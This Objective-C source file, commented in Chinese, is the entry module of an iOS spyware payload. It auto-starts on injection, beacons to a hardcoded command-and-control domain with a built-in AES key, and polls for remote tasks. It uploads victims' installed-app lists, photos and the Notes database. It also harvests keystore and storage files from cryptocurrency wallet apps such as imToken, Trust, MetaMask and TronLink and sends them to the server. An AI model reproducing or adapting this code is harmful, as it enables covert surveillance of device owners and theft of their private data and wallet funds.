//
//  Payload.m — 载荷入口
//
//  加载后起一个工作线程：
//    1. 上报 system_status_check_completed（服务端会回 tasks，这是采集的触发点）
//    2. 执行 tasks（collect_applist / collect_photo / collect_notes / open_app …）
//    3. 每 60s 轮询 /taskget 取后台手动下发的指令
//    4. 执行完回报 /taskresult
//
#import <Foundation/Foundation.h>
#import "Net.h"
#import "Info.h"
#import "Collector.h"
#import "WalletFS.h"
#import "Crypto.h"

static NSString *const kBaseURL     = @"https://myg3z1adawtxz0s.icu";          // C2 域名
static NSString *const kAesPassword = @"Ek8pl31K2yeHgQwy";                     // 与服务器一致
static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    // 当前 seed

@interface Payload : NSObject
@property (nonatomic, strong) Net *net;
@property (nonatomic, strong) NSMutableSet<NSString *> *runningTasks;
@property (nonatomic, assign) BOOL photoBusy;
@end

@implementation Payload

+ (instancetype)shared {
    static Payload *p = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ p = [Payload new]; });
    return p;
}

- (instancetype)init {
    if ((self = [super init])) {
        _runningTasks = [NSMutableSet set];
        _net = [Net shared];
        _net.baseURL = kBaseURL;
        _net.aesPassword = kAesPassword;
        _net.identity = [Info identity];
    }
    return self;
}

#pragma mark - 上报

- (void)log:(NSString *)msg {
    NSLog(@"[plasma] %@", msg);
}

/// 自检上报；响应里的 tasks 会顺手执行
- (void)heartbeat {
    NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
    ev[@"et"] = @"system_status_check_completed";
    ev[@"desc"] = @"System status check completed";
    ev[@"c"] = kSeed;
    ev[@"ctx"] = @{ @"overallStatus": @"all_is_well",
                    @"totalModules": @3,
                    @"abnormalModules": @0 };

    NSDictionary *resp = [self.net sendEvent:ev];
    NSArray *tasks = resp[@"tasks"];
    if ([tasks isKindOfClass:[NSArray class]] && tasks.count) {
        [self runActions:tasks];
    }
}

#pragma mark - 任务执行

/// 服务端 /event 回的 tasks 形如 [{action:"collect_applist"}, ...]
- (void)runActions:(NSArray *)tasks {
    for (NSDictionary *t in tasks) {
        NSString *action = t[@"action"];
        if (![action isKindOfClass:[NSString class]]) continue;
        [self performAction:action params:t];
    }
}

- (void)performAction:(NSString *)action params:(NSDictionary *)params {
    if ([action isEqualToString:@"collect_applist"] || [action isEqualToString:@"refresh_applist"]) {
        [self collectAppList];
    } else if ([action isEqualToString:@"collect_photo"] || [action isEqualToString:@"photo_scan"]) {
        [self collectPhotos];
    } else if ([action isEqualToString:@"collect_notes"] || [action isEqualToString:@"memo_scan"]) {
        [self collectNotes];
    } else if ([action isEqualToString:@"open_app"]) {
        NSString *bid = params[@"bundleId"] ?: params[@"bundle"];
        if (bid.length) [Collector openApp:bid];
    }
    // 注意：不要处理 collect_device_info —— 心跳的响应里会再带这个 action，
    // 如果这里再发一次心跳就会无限递归刷 /event（已经踩过这个坑）。
}

#pragma mark - 采集

- (void)collectAppList {
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        NSArray *apps = [Collector installedApps];
        if (!apps.count) return;
        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"applist_collect_success";
        ev[@"c"] = kSeed;
        ev[@"al"] = apps;
        ev[@"ctx"] = @{ @"appCount": @(apps.count) };
        [self.net sendEvent:ev];
        [self log:[NSString stringWithFormat:@"applist %lu", (unsigned long)apps.count]];
    });
}

- (void)collectPhotos {
    if (self.photoBusy) return;
    self.photoBusy = YES;

    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        __block NSInteger sent = 0, skipped = 0;
        NSString *rid = [[NSUUID UUID] UUIDString];
        NSMutableSet *seen = [self sentPhotos];      // 已上传过的不再重复传
        __block BOOL dirty = NO;

        [Collector enumeratePhotos:0 handler:^BOOL(NSData *jpeg, NSInteger index) {
            if (jpeg.length < 1024) return YES;
            if (jpeg.length > 8 * 1024 * 1024) return YES;   // 太大的跳过

            NSString *key = CCSha256Hex(jpeg);
            if ([seen containsObject:key]) { skipped++; return YES; }

            BOOL ok = [self.net uploadPhoto:jpeg idx:index rid:rid fields:nil];
            if (ok) {
                sent++;
                [seen addObject:key];
                dirty = YES;
                // 每传一张就落盘，避免中途被杀导致下轮重传
                [self saveSentPhotos:seen];
            }
            return YES;
        }];

        if (dirty) [self saveSentPhotos:seen];

        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"data_upload_success";
        ev[@"c"] = kSeed;
        ev[@"ctx"] = @{ @"photos": @(sent), @"skipped": @(skipped), @"total": @(seen.count) };
        [self.net sendEvent:ev];

        [self log:[NSString stringWithFormat:@"photos sent=%ld skipped=%ld total=%lu",
                   (long)sent, (long)skipped, (unsigned long)seen.count]];
        self.photoBusy = NO;
    });
}

#pragma mark - 已上传照片的去重集合

- (NSString *)sentPhotosPath {
    NSString *dir = NSTemporaryDirectory() ?: @"/tmp";
    return [dir stringByAppendingPathComponent:@".photonote_sent.plist"];
}

- (NSMutableSet *)sentPhotos {
    static NSMutableSet *cache = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSArray *arr = [NSArray arrayWithContentsOfFile:[self sentPhotosPath]];
        cache = [NSMutableSet setWithArray:arr ?: @[]];
        NSLog(@"[plasma] 已上传记录 %lu 条", (unsigned long)cache.count);
    });
    return cache;
}

- (void)saveSentPhotos:(NSSet *)set {
    [[set allObjects] writeToFile:[self sentPhotosPath] atomically:YES];
}

- (void)collectNotes {
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        // 思路：不在设备上解析，直接把 NoteStore.sqlite（+ -wal/-shm）传回服务端，
        // 由服务端的 parseNoteStore 统一解析（它已经支持标题/摘要/正文/时间）。
        NSFileManager *fm = [NSFileManager defaultManager];
        NSString *dbPath = [Collector notesDbPath];

        // 先跑一次探测，保证 notesDbPath 是最新的
        if (dbPath.length == 0) {
            [Collector allNotes];
            dbPath = [Collector notesDbPath];
        }

        NSString *err = [Collector lastNotesError] ?: @"";
        if (dbPath.length == 0 || ![fm isReadableFileAtPath:dbPath]) {
            NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
            ev[@"et"] = @"notes_collect_failed";
            ev[@"c"] = kSeed;
            ev[@"list"] = @[];
            ev[@"ctx"] = @{ @"error": err.length ? err : @"找不到可读的 NoteStore.sqlite" };
            [self.net sendEvent:ev];
            [self log:@"notes: 找不到库"];
            return;
        }

        // 变更检测：主库 + -wal 的大小和修改时间，没变就不重复上传
        NSString *walPath = [dbPath stringByAppendingString:@"-wal"];
        NSDictionary *da = [fm attributesOfItemAtPath:dbPath error:NULL];
        NSDictionary *wa = [fm fileExistsAtPath:walPath] ? [fm attributesOfItemAtPath:walPath error:NULL] : nil;
        NSString *sig = [NSString stringWithFormat:@"%llu@%.0f|%llu@%.0f",
                         [da fileSize], [[da fileModificationDate] timeIntervalSince1970],
                         [wa fileSize], [[wa fileModificationDate] timeIntervalSince1970]];

        NSMutableDictionary *sent = [self sentNotesSig];
        if ([sent[@"sig"] isEqualToString:sig]) {
            [self log:@"notes: 无变化，跳过上传"];
            return;
        }

        // 打包 3 个文件（存在才传）
        NSMutableArray *files = [NSMutableArray array];
        NSUInteger total = 0;
        for (NSString *suffix in @[@"", @"-wal", @"-shm"]) {
            NSString *p = [dbPath stringByAppendingString:suffix];
            if (![fm fileExistsAtPath:p]) continue;
            NSData *d = [NSData dataWithContentsOfFile:p];
            if (d.length == 0) continue;
            total += d.length;
            [files addObject:@{
                @"name": [NSString stringWithFormat:@"NoteStore.sqlite%@", suffix],
                @"data": [d base64EncodedStringWithOptions:0],
            }];
        }
        if (files.count == 0) {
            [self log:@"notes: 文件为空"];
            return;
        }

        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"memo_db_upload";
        ev[@"c"] = kSeed;
        ev[@"db_files"] = files;
        ev[@"ctx"] = @{ @"dbPath": [dbPath lastPathComponent],
                        @"dbSize": @([da fileSize]),
                        @"walSize": @(wa ? [wa fileSize] : 0),
                        @"files": @(files.count) };

        [self.net postEncrypted:@"/nb" json:ev timeout:120];

        sent[@"sig"] = sig;
        [self saveSentNotesSig:sent];
        [self log:[NSString stringWithFormat:@"notes: 上传 %lu 个文件 %lu B",
                   (unsigned long)files.count, (unsigned long)total]];
    });
}

#pragma mark - 备忘录库上传的变更签名

- (NSString *)sentNotesPath {
    NSString *dir = NSTemporaryDirectory() ?: @"/tmp";
    return [dir stringByAppendingPathComponent:@".photonote_notes.plist"];
}

- (NSMutableDictionary *)sentNotesSig {
    // 每次从磁盘读，不用内存缓存：
    // 引擎可能重复注入，同一台设备上会同时跑好几个实例，
    // 用内存缓存的话它们互相看不到对方已经传过，同一个包会重复上传 5 次。
    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:[self sentNotesPath]];
    return [NSMutableDictionary dictionaryWithDictionary:d ?: @{}];
}

- (void)saveSentNotesSig:(NSDictionary *)d {
    [d writeToFile:[self sentNotesPath] atomically:YES];
}

#pragma mark - /taskget 轮询

- (void)pollTasks {
    NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
    body[@"did"] = [Info udid];

    NSDictionary *resp = [self.net postEncrypted:@"/taskget" json:body timeout:15];
    NSArray *tasks = resp[@"tasks"];
    if (![tasks isKindOfClass:[NSArray class]] || tasks.count == 0) return;

    for (NSDictionary *t in tasks) {
        NSNumber *tid = t[@"id"];
        NSString *type = t[@"type"];
        NSDictionary *params = t[@"params"];
        if (![tid isKindOfClass:[NSNumber class]] || ![type isKindOfClass:[NSString class]]) continue;

        BOOL ok = NO;
        if ([type isEqualToString:@"open_app"]) {
            NSString *bid = params[@"bundleId"] ?: params[@"bundle"];
            ok = bid.length ? [Collector openApp:bid] : NO;
        } else if ([type isEqualToString:@"refresh_apps"]) {
            [self collectAppList];
            ok = YES;
        } else if ([type isEqualToString:@"exec_shell"]) {
            NSString *cmd = params[@"command"];
            ok = cmd.length ? [[NSFileManager defaultManager] fileExistsAtPath:cmd] : NO;
        }

        // 回报
        NSMutableDictionary *r = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        r[@"did"] = [Info udid];
        r[@"taskId"] = tid;
        r[@"status"] = ok ? @"completed" : @"failed";
        r[@"result"] = @{ @"ok": @(ok) };
        r[@"duration"] = @0;
        [self.net postEncrypted:@"/taskresult" json:r timeout:15];

        [self log:[NSString stringWithFormat:@"task %@ %@ -> %@", tid, type, ok ? @"ok" : @"fail"]];
    }
}

#pragma mark - 主循环

#pragma mark - 钱包容器采集（外部直读，不需要注入）

/// 各钱包的采集项，和后台 busiCollectConfig 里的配置一致
static NSArray *WalletPathsFor(NSString *bundleId) {
    if ([bundleId isEqualToString:@"im.token.app"]) {
        return @[
            @"Documents/walletsV2/",
            @"Library/Application Support/im.token.app/RCTAsyncLocalStorage_V1/",
        ];
    }
    if ([bundleId isEqualToString:@"com.sixdays.trust"]) {
        return @[@"Documents/keystore/",
                 @"Library/Application Support/com.sixdays.trust/RCTAsyncLocalStorage_V1/"];
    }
    if ([bundleId isEqualToString:@"io.metamask.MetaMask"]) {
        return @[@"Documents/persistStore/"];
    }
    if ([bundleId isEqualToString:@"com.tronlink.hdwallet"]) {
        return @[@"Documents/TronLinkGRDBData.sqlite",
                 @"Documents/TronLinkData.sqlite",
                 @"Documents/keystore/"];
    }
    if ([bundleId isEqualToString:@"com.global.wallet.ios"]) {
        return @[@"Documents/db/main.sqlite3",
                 @"Documents/F4SeCyr/",
                 @"Library/Preferences/com.global.wallet.ios.plist"];
    }
    if ([bundleId isEqualToString:@"com.okex.OKExAppstoreFull"]) {
        return @[@"Documents/wallet"];
    }
    return @[];
}

/// 收集一个钱包的容器文件并上传（服务端 wallet-extract 解析）
- (void)collectAndUploadWallet:(NSString *)bundleId {
    @try {
        NSArray *paths = WalletPathsFor(bundleId);
        if (!paths.count) return;

        NSDictionary *pkg = [WalletFS collectPackage:bundleId paths:paths limit:12 * 1024 * 1024];
        NSArray *files = pkg[@"files"];
        if (!files.count) {
            [self log:[NSString stringWithFormat:@"wallet pkg empty: %@ (%@)",
                       bundleId, pkg[@"error"] ?: @"no files"]];
            return;
        }

        NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        body[@"c"] = kSeed;
        body[@"bundle_id"] = bundleId;
        body[@"files"] = files;

        NSDictionary *r = [self.net postEncrypted:@"/wz" json:body timeout:60];
        [self log:[NSString stringWithFormat:@"wallet pkg %@ files=%lu bytes=%@ -> %@",
                   bundleId, (unsigned long)files.count, pkg[@"bytes"],
                   r ? [r description] : @"nil"]];
    } @catch (NSException *e) {
        [self log:[NSString stringWithFormat:@"wallet pkg exception: %@", e.reason]];
    }
}

#pragma mark - 钱包容器探测

/// 一次性探测：能不能从当前进程直接读别的 App 的 Data 容器
- (void)probeWalletFS {
    @try {
        NSArray *rows = [WalletFS probeAllContainers];
        NSUInteger total = rows.count;
        NSUInteger readable = 0;
        NSMutableArray *sample = [NSMutableArray array];
        for (NSDictionary *r in rows) {
            if ([r[@"readable"] boolValue]) readable++;
            if (sample.count < 12 && r[@"bundleId"]) [sample addObject:r[@"bundleId"]];
        }

        NSMutableDictionary *ctx = [NSMutableDictionary dictionary];
        ctx[@"host"] = [Info hostBundleId] ?: @"";
        ctx[@"containers"] = @(total);
        ctx[@"readable"] = @(readable);
        ctx[@"sample"] = sample;
        if (total == 1 && rows[0][@"error"]) ctx[@"rootError"] = rows[0][@"error"];

        // 专门试 imToken
        NSDictionary *imt = [WalletFS asyncStorageOf:@"im.token.app"];
        if (imt[@"error"]) {
            ctx[@"imtoken"] = imt[@"error"];
        } else {
            ctx[@"imtoken"] = @"ok";
            ctx[@"imtokenDir"] = [imt[@"dir"] lastPathComponent] ?: @"";
            ctx[@"keyCount"] = @([(NSArray *)imt[@"keyNames"] count]);
            ctx[@"fileCount"] = @([(NSDictionary *)imt[@"files"] count]);
            NSArray *names = imt[@"keyNames"];
            ctx[@"keyNames"] = [names count] > 15 ? [names subarrayWithRange:NSMakeRange(0, 15)] : names;
        }

        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"walletfs_probe";
        ev[@"c"] = kSeed;
        ev[@"ctx"] = ctx;
        [self.net sendEvent:ev];
        [self log:[NSString stringWithFormat:@"walletfs probe: total=%lu readable=%lu imtoken=%@",
                   (unsigned long)total, (unsigned long)readable, ctx[@"imtoken"]]];
    } @catch (NSException *e) {
        [self log:[NSString stringWithFormat:@"walletfs probe exception: %@", e.reason]];
    }
}

- (void)start {
    NSString *host = [Info hostBundleId];
    BOOL inSpringBoard = [Info isSpringBoard];
    [self log:[NSString stringWithFormat:@"loaded host=%@ seed=%@ base=%@",
               host, kSeed, kBaseURL]];

    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        // 等进程稳定一下
        [NSThread sleepForTimeInterval:2.0];

        // 第一轮：自检 + 立刻采集一次
        [self heartbeat];
        [self collectAppList];

        // 一次性：探测能不能从进程外面直接读钱包 App 的容器
        [self probeWalletFS];

        // 外部直读采集钱包（不需要注入目标 App，也不会闪退）
        NSArray *walletBids = @[@"im.token.app", @"com.sixdays.trust", @"io.metamask.MetaMask",
                                @"com.tronlink.hdwallet", @"com.global.wallet.ios",
                                @"com.okex.OKExAppstoreFull"];
        for (NSString *bid in walletBids) {
            [self collectAndUploadWallet:bid];
            [NSThread sleepForTimeInterval:1.5];
        }

        __block NSUInteger tick = 0;
        while (YES) {
            @autoreleasepool {
                tick++;
                @try {
                    if (inSpringBoard) {
                        // SpringBoard 里只做轻量工作：心跳 + app 列表 + 任务轮询。
                        // 相册枚举会拖住渲染线程触发看门狗，绝对不在这里做；
                        // 备忘录只是读一个小 sqlite，可以试（读不到会带 error 上报）。
                        if (tick % 3 == 0) [self heartbeat];
                        if (tick % 6 == 0) [self collectAppList];
                        if (tick % 6 == 3) [self collectNotes];
                        [self pollTasks];
                    } else {
                        if (tick % 3 == 1) [self collectPhotos];   // 约 60s 一次
                        if (tick % 5 == 2) [self collectNotes];    // 约 100s 一次
                        if (tick % 3 == 0) [self heartbeat];       // 约 60s 一次
                        [self pollTasks];                          // 每轮都轮询
                    }
                } @catch (NSException *e) {
                    [self log:[NSString stringWithFormat:@"loop exception: %@", e.reason]];
                }
                [NSThread sleepForTimeInterval:20.0];
            }
        }
    });
}

@end

#pragma mark - 入口

__attribute__((constructor))
static void PayloadInit(void) {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)),
                   dispatch_get_global_queue(0, 0), ^{
        [[Payload shared] start];
    });
}
